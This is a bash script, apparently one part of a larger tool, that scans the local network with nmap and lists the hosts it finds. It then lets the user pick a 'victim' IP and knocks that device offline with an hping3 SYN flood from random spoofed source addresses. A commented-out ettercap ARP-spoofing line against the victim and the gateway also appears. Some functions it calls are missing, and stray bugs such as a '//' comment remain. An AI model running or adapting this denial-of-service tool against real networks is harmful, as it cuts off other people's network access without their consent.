#!/bin/bash

function getDefaultInterface {
  defaultInterface=$(route | grep '^default' | grep -o '[^ ]*$');
}

function getIPAddress {
  userIPAddress=$(hostname -I | awk '{print $1}' | xargs);
}

function getDefaultGateway {
  defaultGateway=$(ip r | grep default | awk '{print $3}')
}

function getIPAddressesInNetwork {
  printf "\n\nDetecting devices in the network... \n"
  ipAddresses=( $(nmap -n -sn $userIPAddress/24 -oG - | awk '/Up$/{print $2}' | xargs) )
  //getMACAddressesInNetwork
}

function getMACAddressesInNetwork {
  printf "Resolving MAC Addresses... \n"
  #i=0
  #macAddresses=()
  #for ip in "${ipAddresses[@]}"
  #do
  #macAddresses+=( $(arping -I $defaultInterface -c1 $ip | grep from | awk '{print $4}') )
  #  ((i++))
  #done
  victimIPAddress=""
  victimMACAddress=$(arping -I $defaultInterface -c1 $victimIPAddress | grep from | awk '{print $4}')
}

function printIPAddressesInNetwork {

  for ip in "${ipAddresses[@]}"
  do
    echo $ip
  done

}

function showDevicesInNetwork {
  openingHeader

  printf "${YELLOW}Available devices: \n${WHITE}"
  printIPAddressesInNetwork

  askForAnyKeyReturn
}

function removeDeviceFromNetwork {
  openingHeader

  printf "${YELLOW}Available devices: \n${WHITE}"
  i=1
  for ip in "${ipAddresses[@]}"
  do
    echo -e " ${RED}[$i] ${WHITE}"$ip
    ((i++))
  done

  printf "\n SELECT IP TO BLOCK > \n"
  read -r ipSelectedOption

  getMACAddressesInNetwork
  blockAfterSelectIP

  askForAnyKeyReturn
}


function blockAfterSelectIP {
  victimIPAddress=${ipAddresses[ipSelectedOption-1]}
  #victimMACAddress=${macAddresses[ipSelectedOption-1]}
  echo -e " ${YELLOW}Victim IP: ${RED}"$victimIPAddress${WHITE}
  echo -e " ${YELLOW}Victim MAC: ${RED}"$victimMACAddress${WHITE}

  echo "Blocking network access from "$victimIPAddress"..."
  printf "\n\n\n"
  echo -e "${RED}         -> Press CTRL+C to STOP!${WHITE}"
  printf "\n\n"


  hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood --rand-source $victimIPAddress > /dev/null
}

#ettercap -T -q -p -F block.ef -M arp:remote /$victimIPAddress// /$defaultGateway//
